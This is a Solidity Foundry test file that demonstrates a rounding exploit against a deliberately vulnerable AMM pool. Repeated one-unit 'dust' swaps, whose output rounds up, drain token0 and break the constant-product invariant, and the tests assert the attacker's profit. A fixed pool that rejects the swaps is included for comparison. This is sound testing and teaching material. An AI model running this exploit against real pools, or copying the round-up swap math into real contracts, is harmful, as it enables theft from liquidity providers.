// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";
import {Pool} from "../src/Pool.sol";
import {PoolRoundUp} from "../src/vulnerable/PoolRoundUp.sol";

contract RoundingAttackTest is Test {
    Token token0;
    Token token1;
    PoolRoundUp roundUpPool;
    Pool realPool;

    address lp = makeAddr("lp");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token0 = new Token("Token 0", "T0");
        token1 = new Token("Token 1", "T1");

        roundUpPool = new PoolRoundUp(token0, token1);
        realPool = new Pool(token0, token1);

        token0.mint(lp, 1_000);
        token1.mint(lp, 1_000_000);

        // The attacker starts with token1 but no token0.
        token1.mint(attacker, 1_000);

        vm.startPrank(lp);
        token0.approve(address(roundUpPool), type(uint256).max);
        token1.approve(address(roundUpPool), type(uint256).max);
        token0.approve(address(realPool), type(uint256).max);
        token1.approve(address(realPool), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);
        token0.approve(address(roundUpPool), type(uint256).max);
        token1.approve(address(roundUpPool), type(uint256).max);
        token0.approve(address(realPool), type(uint256).max);
        token1.approve(address(realPool), type(uint256).max);
        vm.stopPrank();
    }

    function _seedRoundUpPool() internal {
        vm.prank(lp);
        roundUpPool.addLiquidity(1_000, 1_000_000, 0);
    }

    function _seedRealPool() internal {
        vm.prank(lp);
        realPool.addLiquidity(1_000, 1_000_000, 0);
    }

    function test_DustSwapsDrainPoolWhenOutputRoundsUp() public {
        _seedRoundUpPool();

        uint256 attackerToken1Start = token1.balanceOf(attacker);
        uint256 kBefore = roundUpPool.reserve0() * roundUpPool.reserve1();

        assertEq(kBefore, 1_000_000_000);

        // Exact output is below one token0 unit.
        assertEq(roundUpPool.getAmountOut(1, 1_000_000, 1_000), 1);

        // Each unit of token1 input incorrectly returns one token0.
        for (uint256 i = 0; i < 100; i++) {
            vm.prank(attacker);
            roundUpPool.swap(token1, 1, 0);
        }

        assertEq(roundUpPool.reserve0(), 900);
        assertEq(roundUpPool.reserve1(), 1_000_100);

        uint256 kAfterDustSwaps = roundUpPool.reserve0() * roundUpPool.reserve1();

        assertEq(kAfterDustSwaps, 900_090_000);
        assertLt(kAfterDustSwaps, kBefore);

        assertEq(token0.balanceOf(attacker), 100);
        assertEq(token1.balanceOf(attacker), 900);

        // Sell the 100 accumulated token0 back into the pool.
        vm.prank(attacker);
        uint256 token1Received = roundUpPool.swap(token0, 100, 0);

        assertEq(token1Received, 99_740);
        assertEq(token1.balanceOf(attacker), 100_640);

        assertEq(token1.balanceOf(attacker) - attackerToken1Start, 99_640);

        // Assert the final state after selling the accumulated token0.
        assertEq(roundUpPool.reserve0(), 1_000);
        assertEq(roundUpPool.reserve1(), 900_360);
        assertEq(roundUpPool.reserve0() * roundUpPool.reserve1(), 900_360_000);

        assertEq(token0.balanceOf(address(roundUpPool)), roundUpPool.reserve0());
        assertEq(token1.balanceOf(address(roundUpPool)), roundUpPool.reserve1());
    }

    function test_DustSwapAttackScalesWithSkewedReserves() public {
        _seedRoundUpPool();

        uint256 attackerToken1Start = token1.balanceOf(attacker);
        uint256 kBefore = roundUpPool.reserve0() * roundUpPool.reserve1();

        assertEq(kBefore, 1_000_000_000);

        // Repeat the one-unit extraction 900 times.
        for (uint256 i = 0; i < 900; i++) {
            vm.prank(attacker);
            assertEq(roundUpPool.swap(token1, 1, 0), 1);
        }

        assertEq(roundUpPool.reserve0(), 100);
        assertEq(roundUpPool.reserve1(), 1_000_900);
        assertEq(token0.balanceOf(attacker), 900);
        assertEq(token1.balanceOf(attacker), 100);

        // Sell all 900 accumulated token0 back into the pool.
        vm.prank(attacker);
        uint256 token1Received = roundUpPool.swap(token0, 900, 0);

        assertEq(token1Received, 900_540);
        assertEq(token1.balanceOf(attacker), 900_640);
        assertEq(token1.balanceOf(attacker) - attackerToken1Start, 899_640);

        // Assert the final pool state, after the sell-back.
        assertEq(roundUpPool.reserve0(), 1_000);
        assertEq(roundUpPool.reserve1(), 100_360);
        assertEq(roundUpPool.reserve0() * roundUpPool.reserve1(), 100_360_000);

        assertEq(token0.balanceOf(address(roundUpPool)), roundUpPool.reserve0());
        assertEq(token1.balanceOf(address(roundUpPool)), roundUpPool.reserve1());
    }
    
    function test_DustSwapsDoNotProfitInBalancedPoolWhenOutputRoundsUp() public {
    // Control: same attack, but one token0 is worth about one token1.
    token0.mint(lp, 999_000);
    vm.prank(lp);
    roundUpPool.addLiquidity(1_000_000, 1_000_000, 0);

    uint256 attackerToken1Start = token1.balanceOf(attacker);

    for (uint256 i = 0; i < 100; i++) {
        vm.prank(attacker);
        roundUpPool.swap(token1, 1, 0);
    }

    vm.prank(attacker);
    uint256 token1Received = roundUpPool.swap(token0, 100, 0);

    assertEq(token1Received, 100);
    assertEq(token1.balanceOf(attacker), attackerToken1Start);
    }

    function test_RealPoolRejectsDustAndPunishesRoundTrips() public {
        _seedRealPool();

        // The real pool rounds down to zero and rejects the dust swap.
        assertEq(realPool.getAmountOut(1, 1_000_000, 1_000), 0);

        vm.expectRevert(Pool.ZeroOutput.selector);
        vm.prank(attacker);
        realPool.swap(token1, 1, 0);

        assertEq(realPool.reserve0(), 1_000);
        assertEq(realPool.reserve1(), 1_000_000);
        assertEq(token1.balanceOf(attacker), 1_000);

        // Fund the attacker for the 2,000-token1 round trip.
        token1.mint(attacker, 1_000);
        uint256 attackerToken1Start = token1.balanceOf(attacker);

        vm.prank(attacker);
        uint256 token0Received = realPool.swap(token1, 2_000, 1);

        assertEq(token0Received, 1);

        vm.prank(attacker);
        uint256 token1Received = realPool.swap(token0, 1, 998);

        assertEq(token1Received, 998);
        assertEq(token0.balanceOf(attacker), 0);
        assertEq(token1.balanceOf(attacker), 998);

        assertEq(attackerToken1Start - token1.balanceOf(attacker), 1_002);

        assertEq(realPool.reserve0(), 1_000);
        assertEq(realPool.reserve1(), 1_001_002);
        assertEq(token0.balanceOf(address(realPool)), realPool.reserve0());
        assertEq(token1.balanceOf(address(realPool)), realPool.reserve1());
    }
}
